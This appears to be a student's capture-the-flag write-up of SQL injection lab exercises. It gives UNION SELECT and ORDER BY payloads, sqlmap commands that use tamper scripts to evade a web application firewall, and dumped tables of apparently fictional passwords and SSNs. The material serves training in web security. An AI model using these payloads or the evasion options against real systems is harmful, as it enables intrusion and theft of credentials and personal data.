# SQL Injection

## Important Notes
1st thing's first, it seems most often you need your payload in the URL to start with an apostraphe `'` and end with `--`.

## Determining the number of columns required in a SQL injection UNION attack

When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the WHERE clause of the original query, you would submit:

```' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc. 
```

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

```' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

## Union Select Data Example

```Pets' union select username, password from users--```

## Random Notes

Union selects will **only work** if the column data types match!

This means that if you have a table that contains (int, string) and you want to dump the user credentials table (string:username, string:password), you'll have to concat user+pass and pass in null as the 1st parameter, so the response union select looks like (null, string:concat[username,password])

Will a UNION SELECT return any data? It seems like no, if your query works then the page will render normal, just with no data.







## Determine how many columns are being returned in the original sql payload
Not part of the curiculum but it's an extra tool in my belt I'll eventually need
>Sam' ORDER BY 1#

Returns nothing
>Sam' ORDER BY 2#

Gives an error.
Thus, there is 1 column being returned in the original payload.

>Sam' UNION SELECT ssn from employees#

Returns all SSNs in the employee table.

## ED 103.2.2: Password (20 pts extra)
The flag is Steve Jobs' password.
>Sam' union select pw from passwords where id=2#

alpine

## But how would I have found out that 'passwords' was a table that existed??
>Sam' union select 1 from passwords#

If this returns 1, it proves that the table passwords exists.
Now, column 'pw' I wouldn't have saught out to guess, but I guess any general variation of 'password' should always be checked.

## Dump all the passwords
>Sam' union select pw from passwords#


Haven't gotten this one yet...

### sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" --tamper=between,randomcase,space2comment --random-agent -v 3 -p u --columns -T passwords

```Table: passwords
[3 columns]
+---------+----------------------+
| Column  | Type                 |
+---------+----------------------+
| id      | smallint(5) unsigned |
| isadmin | smallint(5) unsigned |
| pw      | varchar(20)          |
+---------+----------------------+
```



### sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" --tamper=between,randomcase,space2comment --random-agent -v 3 -p u --dump -T passwords
```+----+----------+---------+
| id | pw       | isadmin |
+----+----------+---------+
| 1  | Dropping | 1       |
| 2  | Fl33t    | 0       |
| 3  | d0ggi3   | 0       |
| 4  | h4gg15   | 0       |
| 5  | w1n73r   | 999     |
+----+----------+---------+
```

### sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" --tamper=between,randomcase,space2comment --random-agent -v 3 -p u --dump -T employees
```Table: employees
[5 entries]
+----+-------------+----------------+
| id | ssn         | name           |
+----+-------------+----------------+
| 1  | 111-22-3456 | Bill Gates     |
| 2  | 333-22-4888 | Steve Jobs     |
| 3  | 444-22-1569 | Linus Torvalds |
| 4  | 444-33-1569 | WOZ            |
| 5  | sss-22-1569 | Grouper        |
+----+-------------+----------------+
```

**Steve Job (id=2)'s password = Dropping. He wanted us to do it by manual UNION exploitation, so I'll have to manually do that.

Admin's ID:

1

[ ] - x' UNION SELECT name FROM employees WHERE name='admin' AND substr(id, 1, 1)='1'#
[!] - User x' UNION SELECT name FROM employees WHERE name='admin' AND length(id)='1'# found!



# ED 103.2.4: Sqlmap on a Protected Target (10 pts extra)
`Find the current username, covered by a green box in the image below. That's the flag.`

### Notes
- --current-user

sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" -p u --current-user

### Answer
- current user: 'bill2a@localhost'




# ED 103.2.5: Sqlmap: Retrieving Data (20 pts extra)
```Use Sqlmap on this target:
https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs

Recover the data from the tables. The flag is Steve Jobs' SSN.
```

General notes:
- -T tablename (specify tablename)
- --dump (dump all contents of the table; this is necessary for the command to work)

Key notes to get around WAF:
- --tamper=between,randomcase,space2comment (you need each .py script located in the dir you're working in!!!)
- --random-agent

### sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" --tamper=between,randomcase,space2comment --random-agent -v 3 -p u --tables

```Database: widgets2a
Table: employees
[5 entries]
+----+-------------+----------------+
| id | ssn         | name           |
+----+-------------+----------------+
| 1  | 111-22-3456 | Bill Gates     |
| 2  | 333-22-4888 | Steve Jobs     |
| 3  | 444-22-1569 | Linus Torvalds |
| 4  | 444-33-1569 | WOZ            |
| 5  | sss-22-1569 | Grouper        |
+----+-------------+----------------+
```
